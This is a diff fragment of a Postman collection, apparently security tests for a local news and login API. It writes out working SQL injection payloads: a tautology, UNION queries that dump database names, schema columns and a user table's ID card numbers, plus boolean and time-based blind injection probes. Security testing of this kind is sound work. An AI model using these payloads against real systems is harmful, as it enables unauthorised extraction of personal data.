+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case7：newsid为800，查询无结果",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=800",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "800"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case8：newsid为1 or 1=1",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"type": "text",
+						"value": "application/json",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1 or 1=1",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 or 1=1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case9：获取数据库及用户名",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1 union select database(),user()#",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 union select database(),user()"
+						}
+					],
+					"hash": ""
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case10：获取数据库表名",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1 union select database(),user()#",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 union select database(),user()"
+						}
+					],
+					"hash": ""
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case11：获取userinfo表字段信息",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1 union select COLUMN_NAME,DATA_TYPE from INFORMATION_SCHEMA.Columns where table_name='userinfo' and table_schema='apitest'",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 union select COLUMN_NAME,DATA_TYPE from INFORMATION_SCHEMA.Columns where table_name='userinfo' and table_schema='apitest'"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case12：id关联遍历数据",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1 union select id,IDCard from userinfo",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 union select id,IDCard from userinfo"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case13：猜解数据库名称长度",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news?newsid=1 and(length(database()))>6#",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 and(length(database()))>6"
+						}
+					],
+					"hash": ""
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case14：猜解数据库名称",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news1?newsid=1 and ascii(substr(database(),2,1))=112 %23&=#",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news1"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1 and ascii(substr(database(),2,1))=112 %23"
+						},
+						{
+							"key": "",
+							"value": ""
+						}
+					],
+					"hash": ""
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case15：时间盲注",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "cbe63694-6d97-40c1-b1d4-18b31bb24ca3",
+						"exec": [
+							"var jsonData = JSON.parse(responseBody);\r",
+							"tests[\"sql注入\"] = jsonData.msg != \"登录成功\";\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "04b45e84-6dca-460b-afa5-9936e133bc8c",
+						"exec": [
+							"// 定义password值\r",
+							"password = \"a123456789\"\r",
+							"\r",
+							"//字符串进行md5加密\r",
+							"var strmd5= CryptoJS.MD5(password).toString();\r",
+							"postman.setGlobalVariable(\"password\",strmd5)\r",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"username\": \"'and if(length(database())>=10,sleep(3),1)--+\",\r\n\t\"password\": \"11\"\r\n}",
+					"options": {
+						"raw": {}
+					}
+				},
+				"url": {
+					"raw": "http://{{host}}:5000/login",
+					"protocol": "http",
+					"host": [
+						"{{host}}"
+					],
+					"port": "5000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case15：判断是否存在时间盲注",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"type": "text",
+						"value": "application/json",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news1?newsid=1  and sleep(5)#",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news1"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1  and sleep(5)"
+						}
+					],
+					"hash": ""
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "5.1 case16：通过时间盲注猜解数据库长度",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"id": "a792d8de-2175-452e-a55d-98c0c207031e",
+						"exec": [
+							"// 定义password值",
+							"password = \"a123456\"",
+							"",
+							"//字符串进行md5加密",
+							"var strmd5= CryptoJS.MD5(password).toString();",
+							"postman.setGlobalVariable(\"password\",strmd5)",
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"protocolProfileBehavior": {
+				"disableBodyPruning": true
+			},
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://127.0.0.1:5000/news1?newsid=1  and if(length(database()) = 7,sleep(5),1)#",
+					"protocol": "http",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "5000",
+					"path": [
+						"news1"
+					],
+					"query": [
+						{
+							"key": "newsid",
+							"value": "1  and if(length(database()) = 7,sleep(5),1)"
+						}
+					],
+					"hash": ""
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
